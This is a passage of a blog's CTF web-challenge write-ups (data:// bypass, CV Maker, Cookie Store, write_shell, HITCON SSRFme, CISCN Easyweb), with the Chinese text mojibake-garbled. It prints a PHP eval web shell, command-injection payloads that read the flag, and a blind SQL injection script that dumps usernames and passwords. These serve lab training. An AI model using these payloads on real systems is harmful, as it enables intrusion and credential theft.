class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼š</p><p>å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°changeï¼Œå…ˆå¯¹å‚æ•°è¿›è¡Œbase64è§£å¯†ï¼Œç„¶åå¯¹vçš„æ¯ä¸ªå€¼çš„asciiç åŠ ä¸Ši*2ï¼Œæœ€åè½¬æ¢æˆå­—ç¬¦ä¸²ã€‚</p><p>ipéœ€è¦ç­‰äº127.0.0.1ï¼Œå¹¶ä¸”GETä¼ å‚2333ç­‰äºtodat is a happy day</p><p>åˆ©ç”¨changeå‡½æ•°å¯¹getä¼ å‚fileè¿›è¡ŒåŠ å¯†</p><p>æ„é€ exp:</p><p>GETä¼ å‚2333ä½¿ç”¨dataä¼ªåè®®ï¼Œfileä¼ å‚åº”è¯¥ä¸ºflag.phpï¼Œæ ¹æ®changeå‡½æ•°å†™å‡ºå¯¹åº”è§£å¯†è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>*<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$re</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240115094513866.png" alt="image-20240115094513866"></p><h1 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h1><p>æ³¨å†Œç™»å½•ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ å¤´åƒ</p><p><img src="/../images/image-20240115195846458.png" alt="image-20240115195846458"></p><p>è¿™é‡Œä½¿ç”¨äº†<strong>exif_imagetype</strong>å‡½æ•°ï¼Œé€šè¿‡æ–‡ä»¶å‰å‡ ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡ä»¶çš„ç±»å‹</p><p>æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åæ‰§è¡Œå‘½ä»¤</p><p><img src="/../images/image-20240115200131529.png" alt="image-20240115200131529"></p><p>æ‹¿åˆ°flag</p><p><img src="/../images/image-20240115200206926.png" alt="image-20240115200206926"></p><h1 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h1><p>è®¿é—®ç¯å¢ƒ</p><p><img src="/../images/image-20240115200346544.png" alt="image-20240115200346544"></p><p>å¦‚å›¾ï¼Œéœ€è¦100å…ƒæ‰èƒ½è´­ä¹°flag</p><p>é€‰æ‹©ç¬¬ä¸€ä¸ªå•†å“ï¼ŒæŠ“åŒ…çœ‹ä¸€ä¸‹</p><p><img src="/../images/image-20240115200712606.png" alt="image-20240115200712606"></p><p>å¯¹sessionè§£å¯†</p><p><img src="/../images/image-20240115200753320.png" alt="image-20240115200753320"></p><p>æŠŠ39æ”¹æˆ399ï¼Œidæ”¹ä¸º2</p><p><img src="/../images/image-20240115200915430.png" alt="image-20240115200915430"></p><p>å¾—åˆ°flag</p><p><img src="/../images/image-20240115201017175.png" alt="image-20240115201017175"></p><p><img src="/../images/image-20240115201009632.png" alt="image-20240115201009632"></p><h1 id="çº¢æ˜è°·CTF-2021-write-shell"><a href="#çº¢æ˜è°·CTF-2021-write-shell" class="headerlink" title="[çº¢æ˜è°·CTF 2021]write_shell"></a>[çº¢æ˜è°·CTF 2021]write_shell</h1><p>æ‰“å¼€ç¯å¢ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼š</p><p>å®šä¹‰äº†ä¸¤ä¸ªå‡½æ•°ä¸å…è®¸å†™å…¥é»‘åå•çš„å†…å®¹</p><p>è¿‡æ»¤äº†phpï¼Œä½¿ç”¨çŸ­æ ‡ç­¾<?=?>æ¥ä»£æ›¿ï¼Œç›¸å½“äº**&lt;? echo&gt;;**   ã€‚ä½¿ç”¨â€.â€æ‹¼æ¥</p><p>æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=(p.hpinfo)()?&gt;</span><br></pre></td></tr></table></figure><p>å†™å…¥</p><p>pwdæŸ¥çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=pwd</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240116093421790.png" alt="image-20240116093421790"></p><p><img src="/../images/image-20240116093510146.png" alt="image-20240116093510146"></p><p>å°è¯•è¯»å–ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½¿ç”¨%09ä»£æ›¿(æˆ–è€…\t)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?=`cat%09/f*`?&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åpwdè·å–æ–‡ä»¶ç›®å½•</p><p>è®¿é—®å¾—åˆ°flag</p><p><img src="/../images/image-20240116095156452.png" alt="image-20240116095156452"></p><h1 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h1><p>æ‰“å¼€ç¯å¢ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;GET &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));</span><br><span class="line">    <span class="variable">$info</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">    <span class="variable">$dir</span>  = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ²™ç®±æ–‡ä»¶å¤¹ï¼Œè·¯å¾„ä¸ºsanbox&#x2F;+md5åŠ å¯†orangeå’Œipåœ°å€</p><p>ç„¶åå‘½ä»¤æ‰§è¡Œurlï¼Œå‘½ä»¤æ‰§è¡Œçš„å‰ææ˜¯å‰é¢å¿…é¡»è¦æœ‰ä¸€ä¸ªå’Œè¿™ä¸ªå‘½ä»¤ä¸€æ ·çš„æ–‡ä»¶å¤¹</p><p>å‘½ä»¤æ‰§è¡Œçš„ç»“æœä¼šå­˜åˆ°ä»¥filenameå‚æ•°å‘½åçš„æ–‡ä»¶å¤¹é‡Œ</p><p>æˆ‘ä»¬å…ˆçœ‹ä¸‹æ ¹ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/&amp;filename=aaa</span><br></pre></td></tr></table></figure><p>è·¯å¾„ä¸º:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sandbox/(orange+ip)md5åŠ å¯†/aaa</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ ¹ç›®å½•ä¸‹æœ‰flagå’Œreadflag</p><p><img src="/../images/image-20240116211139889.png" alt="image-20240116211139889"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨readflagè¯»å–flag</p><p>å…ˆæ„é€ ä¸€ä¸ªbash -c &#x2F;readflag|çš„ç›®å½•</p><p>è¿™é‡Œä½¿ç”¨bash -cç›¸å½“äº.&#x2F;readflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=&amp;filename=bash -c /readflag|</span><br></pre></td></tr></table></figure><p>ç„¶åè¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:bash -c /readflag|&amp;file=aaa</span><br></pre></td></tr></table></figure><p>è®¿é—®å¾—åˆ°flag</p><p><img src="/../images/image-20240116211634123.png" alt="image-20240116211634123"></p><p>æˆ–è€…ç›´æ¥ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://f4334615-026a-4151-aa24-7f646ec51cf5.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">requests.get(target+<span class="string">&quot;/?url=&amp;filename=|bash -c /readflag&quot;</span>)</span><br><span class="line">requests.get(target+<span class="string">&quot;/?url=file:|bash -c /readflag&amp;filename=a&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(requests.get(target+<span class="string">&quot;/sandbox/b128179d742ee5f050b60a1321fdc512/aaa&quot;</span>).text)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240116212038170.png" alt="image-20240116212038170"></p><h1 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h1><p>æ‰“å¼€ç¯å¢ƒï¼Œæç¤ºç™»å½•</p><p><img src="/../images/image-20240117093544792.png" alt="image-20240117093544792"></p><p>çœ‹çœ‹robots.txtï¼Œæç¤ºå¤‡ä»½æ–‡ä»¶</p><p><img src="/../images/image-20240117093628083.png" alt="image-20240117093628083"></p><p>ä½†æ˜¯index.phpæ²¡æœ‰å¤‡ä»½</p><p><img src="/../images/image-20240117093704458.png" alt="image-20240117093704458"></p><p>ç»§ç»­F12æŸ¥çœ‹ä¸€ä¸‹</p><p><img src="/../images/image-20240117093747499.png" alt="image-20240117093747499"></p><p>çœ‹åˆ°æœ‰image.php?id&#x3D;2ï¼Œå¯èƒ½æœ‰SQLæ³¨å…¥</p><p>çœ‹çœ‹å¤‡ä»½æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">addslashes</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><p>GETä¼ å‚idå’Œpathï¼Œä½†æ˜¯å¯¹idå’Œpathåšäº†åæ–œæ å¤„ç†</p><p>str_repalce()åˆ™æ˜¯å¯¹ç»addslashes()å¤„ç†åçš„idå’Œpathè¿›è¡Œæ›¿æ¢</p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><p>å½“æˆ‘ä»¬ä¼ å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=\0  ä¼šå˜æˆid=\\0</span><br></pre></td></tr></table></figure><p>0ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆåªå‰©ä¸‹ä¸€ä¸ªåæ–œæ ï¼Œè€Œåæ–œæ ä¼šæ³¨é‡Šæ‰idåé¢çš„å•å¼•å·ï¼Œæˆ‘ä»¬å†å¯¹pathçš„å‚æ•°æœ«å°¾åŠ ä¸Šæ³¨é‡Šï¼Œæ³¨é‡Špathåé¢çš„å•å¼•å·ï¼Œæ„é€ æ°¸çœŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=\0&amp;path= or 1%23</span><br></pre></td></tr></table></figure><p>å®é™…æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27; or path = &#x27; or 1</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆé¡µé¢å°±ä¼šæ­£å¸¸æ˜¾ç¤º</p><p><img src="/../images/image-20240117095325357.png" alt="image-20240117095325357"></p><p>ä½†æ˜¯è¿™é‡Œæ˜¯ç›²æ³¨ï¼Œä½¿ç”¨å¤§ä½¬çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url_format,length=<span class="literal">None</span></span>):</span><br><span class="line">    rlt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    url  = url_format</span><br><span class="line">    <span class="keyword">if</span> length==<span class="literal">None</span>:</span><br><span class="line">        length = <span class="number">30</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">    <span class="comment">#ä»å¯æ‰“å°å­—ç¬¦å¼€å§‹</span></span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        ends = <span class="number">126</span></span><br><span class="line">        tmp = (begin+ends)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin&lt;ends:</span><br><span class="line">            r = requests.get(url.<span class="built_in">format</span>(l,tmp))</span><br><span class="line">            <span class="keyword">if</span> r.content!=<span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">                begin = tmp+<span class="number">1</span></span><br><span class="line">                tmp = (begin+ends)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ends = tmp</span><br><span class="line">                tmp = (begin+ends)//<span class="number">2</span></span><br><span class="line">        <span class="comment">#é…Œæƒ…åˆ é™¤ï¼Œæ¯•ç«Ÿä¸€èˆ¬åº“è¡¨åˆ—é‡Œéƒ½æ²¡æœ‰ç©ºæ ¼</span></span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        rlt+=<span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(rlt)</span><br><span class="line">    <span class="keyword">return</span> rlt.rstrip()</span><br><span class="line">url =<span class="string">&#x27;http://5d149200-26ad-4ca5-ac16-188511fa9354.node5.buuoj.cn:81/image.php?id=\\0&amp;path=or%20ord(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;æ•°æ®åº“åä¸ºï¼š&#x27;</span>,exp(url))</span><br><span class="line">url =<span class="string">&#x27;http://5d149200-26ad-4ca5-ac16-188511fa9354.node5.buuoj.cn:81/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x636973636e66696e616c),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;è¡¨åä¸ºï¼š&#x27;</span>,exp(url))</span><br><span class="line">url =<span class="string">&#x27;http://5d149200-26ad-4ca5-ac16-188511fa9354.node5.buuoj.cn:81/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=0x636973636e66696e616c and table_name=0x7573657273),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;åˆ—åä¸ºï¼š&#x27;</span>,exp(url))</span><br><span class="line">url =<span class="string">&#x27;http://5d149200-26ad-4ca5-ac16-188511fa9354.node5.buuoj.cn:81/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(username)%20from%20users),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ç”¨æˆ·åä¸ºï¼š&#x27;</span>,exp(url))</span><br><span class="line">url =<span class="string">&#x27;http://5d149200-26ad-4ca5-ac16-188511fa9354.node5.buuoj.cn:81/image.php?id=\\0&amp;path=or%20ord(substr((select%20group_concat(password)%20from%20users),&#123;&#125;,1))&gt;&#123;&#125;%23&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;å¯†ç ä¸ºï¼š&#x27;</span>,exp(url))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240117102124449.png" alt="image-20240117102124449"></p><p>ç™»é™†æˆåŠŸ</p><p><img src="/../images/image-20240117102152906.png" alt="image-20240117102152906"></p><p>è¿™é‡Œéœ€è¦ä¸Šä¼ æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¼ ä¸ªé©¬è¯•è¯•</p><p><img src="/../images/image-20240117102239075.png" alt="image-20240117102239075"></p><p>ä¸å…è®¸ä¸Šä¼ phpæ–‡ä»¶ï¼Œä½†å¯ä»¥ä¸Šä¼ phtmlæ–‡ä»¶</p><p>ä¸Šä¼ ä¹‹åæˆ‘ä»¬å¯ä»¥å‘ç°æ–‡ä»¶åæ˜¯è¢«å†™å…¥è¿™ä¸ªphpæ–‡ä»¶çš„ï¼Œé‚£ä¹ˆå°±æŠŠä¸€å¥è¯å†™åœ¨æ–‡ä»¶åä¸­</p><p><img src="/../images/image-20240117104306897.png" alt="image-20240117104306897"></p><p><img src="/../images/image-20240117104250568.png" alt="image-20240117104250568"></p><p>èšå‰‘ç›´è¿</p><p><img src="/../images/image-20240117104339248.png" alt="image-20240117104339248"></p><p>å¾—åˆ°flag</p><p><img src="/../images/image-20240117104416528.png" alt="image-20240117104416528"></p><h1 id="WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#WUSTCTF2020-é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h1><p>ç›²æ³¨</p><p><img src="/../images/image-20240117183243963.png" 